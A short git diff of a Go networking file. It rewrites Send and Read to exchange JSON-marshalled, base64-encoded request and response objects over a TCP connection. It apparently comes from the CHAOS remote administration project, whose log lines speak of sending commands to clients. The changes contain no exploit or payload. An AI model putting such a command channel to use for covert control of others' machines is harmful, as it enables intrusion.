@@ -3,12 +3,18 @@ package network
 import (
 	"bufio"
 	"encoding/base64"
+	"encoding/json"
 	log "github.com/sirupsen/logrus"
+	"github.com/tiagorlampert/CHAOS/internal/models"
 	"net"
 )
 
-func Send(conn net.Conn, input []byte) error {
-	encoded := base64.StdEncoding.EncodeToString(input)
+func Send(conn net.Conn, request models.Request) error {
+	marshal, err := json.Marshal(request)
+	if err != nil {
+		return err
+	}
+	encoded := base64.StdEncoding.EncodeToString(marshal)
 	if err := Write(conn, encoded); err != nil {
 		log.WithField("cause", err.Error()).Error("error sending command to client")
 		return err
@@ -16,7 +22,7 @@ func Send(conn net.Conn, input []byte) error {
 	return nil
 }
 
-func Read(conn net.Conn) ([]byte, error) {
+func Read(conn net.Conn) (*models.Response, error) {
 	message, err := bufio.NewReader(conn).ReadString('\n')
 	if err != nil {
 		log.WithField("cause", err.Error()).Error("error reading response from connection")
@@ -27,7 +33,11 @@ func Read(conn net.Conn) ([]byte, error) {
 		log.WithField("cause", err.Error()).Error("error decoding response from connection")
 		return nil, err
 	}
-	return decoded, err
+	var response models.Response
+	if err := json.Unmarshal(decoded, &response); err != nil {
+		return nil, err
+	}
+	return &response, err
 }
 
 func Write(conn net.Conn, v string) error {
